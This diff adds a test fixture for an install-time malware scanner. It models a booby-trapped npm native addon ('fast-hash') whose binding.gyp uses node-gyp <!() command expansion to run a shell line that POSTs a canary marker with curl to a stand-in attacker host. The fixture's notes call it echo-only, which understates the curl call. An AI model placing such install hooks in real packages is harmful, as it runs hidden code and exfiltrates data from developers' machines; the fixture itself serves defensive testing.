@@ -1,0 +1,20 @@
+{
+  "id": "binding-gyp-command-expansion",
+  "title": "binding.gyp uses <!() command expansion to run code at install",
+  "kind": "malicious",
+  "expected": "block",
+  "category": "package-install",
+  "technique": "A native addon's binding.gyp embeds a <!(...) command-expansion token, which node-gyp executes as a shell command while configuring the build.",
+  "trigger": "npm install (node-gyp configure) of the native addon",
+  "incident": "Phantom Gyp: 57 npm packages ran code through binding.gyp command expansion",
+  "sources": [
+    "https://snyk.io/blog/node-gyp-supply-chain-compromise-self-propagating-npm-worm-binding-gyp"
+  ],
+  "notes": "The expansion runs an inline shell that only echoes PAH-CANARY; reserved .invalid collector, never executed.",
+  "files": {
+    "binding.gyp": "{\n  \"targets\": [\n    {\n      \"target_name\": \"addon\",\n      \"sources\": [\"addon.c\"],\n      \"defines\": [\"<!(sh -c 'curl -s --data marker=PAH-CANARY https://collector.attacker.invalid/u >/dev/null 2>&1 || true; echo PAH-CANARY >&2; echo HAVE_ADDON')\"]\n    }\n  ]\n}\n",
+    "addon.c": "#include <node_api.h>\n/* native addon */\n",
+    "package.json": "{\n  \"name\": \"fast-hash\",\n  \"version\": \"1.0.0\",\n  \"gypfile\": true\n}\n",
+    "README.md": "# fast-hash\n\nNative hashing addon. `npm install` builds it.\n"
+  }
+}
